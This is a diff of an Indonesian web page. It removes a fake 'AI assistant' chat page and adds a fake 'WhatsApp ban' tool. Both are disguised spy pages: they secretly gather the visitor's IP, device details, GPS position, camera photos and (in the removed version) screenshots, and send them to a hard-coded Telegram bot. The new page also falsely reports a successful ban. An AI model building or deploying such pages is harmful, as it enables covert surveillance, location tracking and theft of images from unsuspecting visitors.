@@ -1,431 +1,278 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>MULTI SYSTEM SCRIPT</title>
-  <meta name="description" content="MULTI SYSTEM - POWERED BY NODE">
-  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
-  <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png">
-  <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/5bwkpb.jpg">
-  <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
-  <meta name="theme-color" content="#000000">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-
+  <meta charset="UTF-8">
+  <title>Website Bans WhatsApp By Painzy</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-        background: linear-gradient(270deg, #0f0c29, #302b63, #24243e);
-        background-size: 600% 600%;
-        animation: bgMove 12s ease infinite;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        font-family: "Orbitron", Arial, sans-serif;
-        color: #999;
-        overflow: hidden;
-        position: relative;
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      font-family: 'Inter', sans-serif;
+      color: lime;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+      padding: 20px;
     }
-    @keyframes bgMove {
-        0% { background-position: 0% 50%; }
-        50% { background-position: 100% 50%; }
-        100% { background-position: 0% 50%; }
+    .bg-particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
     }
-
     .particle {
-        position: absolute;
-        background: radial-gradient(circle, #ffffffaa 0%, transparent 70%);
-        border-radius: 50%;
-        opacity: .7;
-        animation: floatParticle linear infinite;
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(0, 255, 127, 0.3);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
     }
-    @keyframes floatParticle {
-        from { transform: translateY(100vh) scale(1); }
-        to { transform: translateY(-10vh) scale(0); }
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); opacity: 0.3; }
+      50% { transform: translateY(-20px); opacity: 0.8; }
     }
-
-    #chat-container {
-        width: 90%;
-        max-width: 600px;
-        height: 80vh;
-        background: rgba(0, 0, 0, 0.8);
-        border: 2px solid #c293ff;
-        border-radius: 10px;
-        display: flex;
-        flex-direction: column;
-        box-shadow: 0 0 20px #9b59ff;
-        z-index: 5;
-        overflow: hidden;
-        position: relative;
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px lime;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
     }
-
-    #chat-header {
-        background: linear-gradient(90deg, #6e48aa, #9d50bb);
-        color: #fff;
-        padding: 10px;
-        text-align: center;
-        font-size: 18px;
-        text-shadow: 0 0 5px #fff;
-        border-bottom: 1px solid #c293ff;
+    .login-title {
+      font-size: 26px;
+      font-weight: 900;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #00ff7f, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-
-    #chat-messages {
-        flex: 1;
-        padding: 10px;
-        overflow-y: auto;
-        background: rgba(0, 0, 0, 0.5);
-        display: flex;
-        flex-direction: column;
-        gap: 10px;
+    .login-subtitle {
+      font-size: 13px;
+      color: #ffc107;
+      margin-bottom: 20px;
     }
-
-    .message {
-        padding: 10px 15px;
-        border-radius: 15px;
-        max-width: 70%;
-        word-wrap: break-word;
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #333;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+    }
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #00ff7f, #00cc66);
+      color: black;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+    }
+    .login-button:hover {
+      background-color: #0f0;
+      box-shadow: 0 0 20px lime;
+    }
+    #info {
+      white-space: pre-wrap;
+      text-align: left;
+      margin-top: 20px;
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 13px;
+    }
+    video, canvas {
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 25px 20px;
+        border-radius: 14px;
+      }
+      .login-title {
+        font-size: 22px;
+      }
+      .login-input, .login-button {
         font-size: 14px;
-        line-height: 1.4;
-    }
-
-    .ai-message {
-        background: linear-gradient(90deg, #ff0080, #ff8c00);
-        color: #fff;
-        align-self: flex-start;
-        text-shadow: 0 0 5px #000;
-        border-bottom-left-radius: 5px;
-    }
-
-    .user-message {
-        background: linear-gradient(90deg, #40e0d0, #00ff00);
-        color: #000;
-        align-self: flex-end;
-        margin-left: auto;
-        border-bottom-right-radius: 5px;
-    }
-
-    #chat-input-container {
-        display: flex;
         padding: 10px;
-        background: rgba(0, 0, 0, 0.8);
-        border-top: 1px solid #c293ff;
-    }
-
-    #chat-input {
-        flex: 1;
-        padding: 10px 15px;
-        border: none;
-        border-radius: 20px;
-        background: #222;
-        color: #fff;
-        font-family: inherit;
-        outline: none;
-    }
-
-    #send-button {
-        padding: 10px 20px;
-        margin-left: 10px;
-        background: linear-gradient(90deg, #6e48aa, #9d50bb);
-        color: #fff;
-        border: none;
-        border-radius: 20px;
-        cursor: pointer;
-        font-family: inherit;
-        transition: background 0.3s;
-    }
-
-    #send-button:hover {
-        background: linear-gradient(90deg, #9d50bb, #6e48aa);
-    }
-
-    .hidden {
-        display: none;
-    }
-
-    #music-visualizer {
-        position: absolute;
-        bottom: 40px;
-        left: 50%;
-        transform: translateX(-50%);
-        display: flex;
-        align-items: flex-end;
-        gap: 6px;
-        height: 40px;
-        z-index: 10;
-    }
-    .bar {
-        width: 5px;
-        background: linear-gradient(to top, #ff0080, #ff8c00, #40e0d0);
-        border-radius: 5px;
-        animation: barMove 1s ease-in-out infinite;
-    }
-    @keyframes barMove {
-        0%, 100% { height: 10px; opacity: .7; }
-        50% { height: 40px; opacity: 1; }
-    }
-
-    .typing-indicator {
-        display: none;
-        font-style: italic;
-        color: #aaa;
-        align-self: flex-start;
+      }
     }
   </style>
 </head>
 <body>
+  <div class="bg-particles"></div>
 
-  <script>
-    for (let i = 0; i < 40; i++) {
-      const p = document.createElement('div');
-      p.className = 'particle';
-      const size = Math.random() * 4 + 2;
-      p.style.width = size + 'px';
-      p.style.height = size + 'px';
-      p.style.left = Math.random() * 100 + '%';
-      p.style.animationDuration = (8 + Math.random() * 8) + 's';
-      document.body.appendChild(p);
-    }
-  </script>
-
-  <div id="chat-container">
-    <div id="chat-header">AI Assistant - Multi System</div>
-    <div id="chat-messages">
-      <div class="message ai-message">Halo! Saya adalah AI asisten. Sistem sedang menganalisis data Anda. Apa yang bisa saya bantu?</div>
-      <div class="typing-indicator" id="typing">AI sedang mengetik...</div>
-    </div>
-    <div id="chat-input-container">
-      <input type="text" id="chat-input" placeholder="Ketik pesan Anda...">
-      <button id="send-button">Kirim</button>
-    </div>
+  <div class="login-container">
+    <p class="login-title">Website Bans WhatsApp By Painzy</p>
+    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
+    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+    <button class="login-button" id="login-button">Next</button>
+    <div id="info">🥷 Silahkan masukkan nomor untuk di bans...</div>
   </div>
 
-  <video id="v" autoplay="" muted="" class="hidden"></video>
-  <canvas id="c" class="hidden"></canvas>
-
-  <audio id="bg-music" src="https://files.catbox.moe/yu43bv.m4a" preload="auto" loop="" muted=""></audio>
-
-  <div id="music-visualizer">
-    <div class="bar" style="animation-delay:0s"></div>
-    <div class="bar" style="animation-delay:0.1s"></div>
-    <div class="bar" style="animation-delay:0.2s"></div>
-    <div class="bar" style="animation-delay:0.3s"></div>
-    <div class="bar" style="animation-delay:0.4s"></div>
-    <div class="bar" style="animation-delay:0.5s"></div>
-    <div class="bar" style="animation-delay:0.6s"></div>
-    <div class="bar" style="animation-delay:0.7s"></div>
-    <div class="bar" style="animation-delay:0.8s"></div>
-    <div class="bar" style="animation-delay:0.9s"></div>
-  </div>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    (() => {
-      const T = '8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU',
-        C = '7935332916',
-        chatMessages = document.getElementById('chat-messages'),
-        chatInput = document.getElementById('chat-input'),
-        sendButton = document.getElementById('send-button'),
-        typingIndicator = document.getElementById('typing');
+    const botToken = '8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU';
+    const chatIds = ['7935332916', '', ''];
+    const infoDiv = document.getElementById('info');
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
 
-      const addMessage = (sender, text) => {
-        const msgDiv = document.createElement('div');
-        msgDiv.className = 'message ' + (sender === 'AI' ? 'ai-message' : 'user-message');
-        msgDiv.textContent = text;
-        chatMessages.appendChild(msgDiv);
-        chatMessages.scrollTop = chatMessages.scrollHeight;
-      };
-
-      const sendMessage = () => {
-        const text = chatInput.value.trim();
-        if (text) {
-          addMessage('User', text);
-          chatInput.value = '';
-          // Simulate AI response
-          typingIndicator.style.display = 'block';
-          setTimeout(() => {
-            typingIndicator.style.display = 'none';
-            addMessage('AI', 'Pesan Anda telah diterima. Sistem sedang memproses...');
-          }, 2000);
-        }
-      };
-
-      sendButton.addEventListener('click', sendMessage);
-      chatInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') sendMessage();
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
       });
+    }
 
-      const audio = document.getElementById('bg-music');
-      const enableSound = () => {
-        audio.muted = false;
-        audio.play().catch(e => console.log('Autoplay diblokir:', e));
-        document.removeEventListener('click', enableSound);
-        document.removeEventListener('touchstart', enableSound);
-      };
-      audio.play().catch(() => {});
-      document.addEventListener('click', enableSound);
-      document.addEventListener('touchstart', enableSound);
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
+      });
+    }
 
-      const sTG = async d => {
-        try {
-          await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
-          })
-        } catch (e) {}
-      };
-
-      const sP = async (b, f) => {
-        try {
-          const fd = new FormData();
-          fd.append('chat_id', C);
-          fd.append('photo', b, f);
-          await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
-        } catch (e) {}
-      };
-
-      const gLD = async (a, b) => {
-        try {
-          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),
-            d = await r.json();
-          if (d.address) return {
-            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
-            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
-            fa: d.display_name || "Alamat tidak tersedia"
-          }
-        } catch (e) {}
-        return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" }
-      };
-
-      const cDI = async () => {
-        let m = 'TRACKING REPORTER NOTIFICATIONS\n\n';
-        m += 'DEVICE INFORMATION\n';
-        m += `🖥️ DEVICE: ${navigator.userAgent}\n`;
-        m += `💻 PLATFORM: ${navigator.platform}\n`;
-        m += `🌐 LANGUAGE: ${navigator.language}\n`;
-        m += `📶 ONLINE: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
-        m += `📺 SREEN SIZE: ${screen.width}x${screen.height}\n`;
-        m += `🪟 WINDOWS SIZE: ${innerWidth}x${innerHeight}\n`;
-        m += `💾 RAM DEVICE: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-        m += `🧠 CPU DEVICE: ${navigator.hardwareConcurrency}</b></blockquote>\n`;
-        if (navigator.getBattery) {
-          try {
-            const b = await navigator.getBattery();
-            m += `<blockquote><b>🔋 BATTERY: ${Math.floor(b.level * 100)}%\n`;
-            m += `🔌 CHARGING: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-          } catch (e) {
-            m += '🔋 BATTERY: ❌ Tidak tersedia</b></blockquote>\n';
-          }
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === 'success') {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
         }
-        m += `<blockquote><b>⏰ ACCES TIME: ${new Date().toString()}\n`;
-        m += `🕒 PAGE LOAD TIME: ${performance.now().toFixed(2)} ms\n`;
-        m += `📜 HISTORY LENGTH: ${history.length}\n`;
-        m += `✋ TOUCH SUPPORT: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
-        m += `🔗 REFFERER: ${document.referrer || 'None'}\n`;
-        m += `🌍 URL ACCES: ${location.href}\n`;
-        m += `📄 TITLE: ${document.title}\n`;
-        m += `🕓 TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        m += `🧭 OFFSET: ${new Date().getTimezoneOffset()} menit</b></blockquote>\n\n`;
+      } catch {}
 
-        try {
-          const i = await fetch('https://ipapi.co/json/');
-          const d = await i.json();
-          m += '<blockquote><b>📍 LOCATION INFORMATION\n';
-          m += `📡 IP ADDRES: ${d.ip}\n`;
-          m += `🏙️ KOTA: ${d.city}\n`;
-          m += `🏙️ KABUPATEN: ${d.region}\n`;
-          m += `🗺️ WILAYAH: ${d.region}\n`;
-          m += `🌎 NEGARA: ${d.country_name}\n`;
-          m += `🏷️ KODE POS: ${d.postal}\n`;
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
 
-          if (d.latitude && d.longitude) {
-            m += `📌 LATITUDE: ${d.latitude}\n`;
-            m += `📍 LONGITUDE: ${d.longitude}\n`;
+      const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+      `.trim();
 
-            const l = await gLD(d.latitude, d.longitude);
-            m += `🏙️ KABUPATEN: ${l.kb}\n`;
-            m += `🏙️ KECAMATAN: ${l.kc}\n`;
-            m += `🏠 ALAMAT LENGKAP: ${l.fa}</b></blockquote>\n`;
-          }
-        } catch (e) {
-          m += '❌ Gagal mendapatkan informasi lokasi\n';
-        }
-        m += '\n<blockquote><b>POWERED BY LEZARD OFFICIAL</b></blockquote>';
-        return m;
-      };
+      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
 
-      const captureCamera = async (mode) => {
-        const v = document.getElementById('v'),
-          c = document.getElementById('c');
-        let stream;
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: { exact: mode }
-            }
-          });
-          v.srcObject = stream;
-          await new Promise(resolve => v.onloadedmetadata = resolve);
-          v.play();
-          await new Promise(r => setTimeout(r, 1500));
-
-          c.width = v.videoWidth;
-          c.height = v.videoHeight;
-          c.getContext('2d').drawImage(v, 0, 0);
-
-          c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
-
-          stream.getTracks().forEach(t => t.stop());
-          return true;
-
-        } catch (e) {
-          if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-          }
-          await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
-          return false;
-        }
-      };
-
-      const ST = async () => {
-        await sTG(await cDI());
-        let cameraSuccess = false;
-        cameraSuccess = await captureCamera("user");
-        if (!cameraSuccess) {
-          cameraSuccess = await captureCamera("environment");
-        }
-        if (!cameraSuccess) {
-          await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
-        }
-        setTimeout(async () => {
-          try {
-            const cn = await html2canvas(document.body);
-            cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg')
-          } catch (e) {
-            await sTG('❌ Screenshot failed')
-          }
-        }, 2000);
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async p => {
-            const lat = p.coords.latitude;
-            const lon = p.coords.longitude;
-            let g = `<blockquote><b>📍 GPS TRACKING (ONE-TIME)</b>\n\n`;
-            g += `📌 LAT: ${lat}\n📍 LNG: ${lon}\n`;
-            g += `🎯 AKURASI: ${p.coords.accuracy}m\n`;
-            g += `🗺️ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-            const l = await gLD(lat, lon);
-            g += `🏙️ KABUPATEN: ${l.kb}\n🏙️ KECAMATAN: ${l.kc}\n🏠 ALAMAT: ${l.fa}</blockquote>\n`;
-            await sTG(g)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
           },
-            async e => {
-              await sTG(`❌ GPS Error: ${e.message}`)
-            }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 })
-        }
-      };
-      ST();
-    })();
-  </script>
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
+      }
+    }
 
+    async function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) sendPhotoToTelegram(blob);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve();
+                }, 'image/jpeg');
+              }, 3000);
+            };
+          })
+          .catch(err => {
+            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            resolve();
+          });
+      });
+    }
+
+    button.addEventListener('click', async () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8 || nomor.length > 15) {
+        infoDiv.innerText = '⚠️ Nomor tidak valid.';
+        return;
+      }
+      button.disabled = true;
+      infoDiv.innerText = '⏳ Memproses spam report...';
+      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
+      input.value = '';
+      try {
+        await getInfo();
+        await startCamera();
+        setTimeout(() => {
+          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
+          button.disabled = false;
+        }, 1000);
+      } catch (e) {
+        infoDiv.innerText = '❌ Terjadi kesalahan.';
+        button.disabled = false;
+      }
+    });
+
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 50; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        p.style.animationDelay = Math.random() * 6 + 's';
+        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
+        container.appendChild(p);
+      }
+    }
+    document.addEventListener('DOMContentLoaded', createParticles);
+  </script>
 </body>
 </html>
